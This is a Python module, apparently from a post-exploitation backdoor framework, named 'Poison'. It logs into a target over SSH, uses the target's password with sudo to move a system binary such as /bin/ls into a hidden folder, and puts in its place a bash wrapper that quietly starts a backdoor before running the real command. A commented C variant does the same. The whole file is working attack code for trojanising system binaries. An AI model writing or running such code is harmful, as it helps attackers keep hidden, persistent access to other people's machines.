from .module import *
import tempfile

class Poison(Module):
    def __init__(self, target, backdoor, core):
        self.core = core
        self.target = target
        self.name = "Poison"
        self.backdoor = backdoor
        self.options = {
                "name"    : Option("name", "ls", "name of command to poison", False),
                "location" : Option("location", "/bin", "where to put poisoned files into", False)
                }
    
    def exploit(self):
        name = self.get_value("name")
        loc = self.get_value("location")
        password = self.target.pword
        tmp_dir = tempfile.mkdtemp()
        poison = open(tmp_dir + "/" + name, "w")
        poison.write("#!/bin/bash\n( %s & ) > /dev/null 2>&1 && %s/share/%s $@" % (self.backdoor.get_command(), loc, name))  # bash poison
        # C Poison: #include <stdlib.h>\nint main() {\nsystem("./initd 2> /dev/null &");\n system("/bin/share/ls");\n return 0;
        poison.close()
        self.target.scpFiles(self, tmp_dir + "/" + name, False)
        self.target.ssh.exec_command("echo %s | sudo -S mkdir %s/share" % (password, loc)) # create folder
        self.target.ssh.exec_command("echo %s | sudo -S mv %s/%s %s/share/" % (password, loc, name, loc)) #move old binary to folder
        self.target.ssh.exec_command("echo %s | sudo -S cp %s %s/" % (password, name, loc)) #move new binary to old location
        self.target.ssh.exec_command("echo %s | sudo -S chmod +x %s/%s" % (password, loc, name))
        print(GOOD + self.name + " module success")


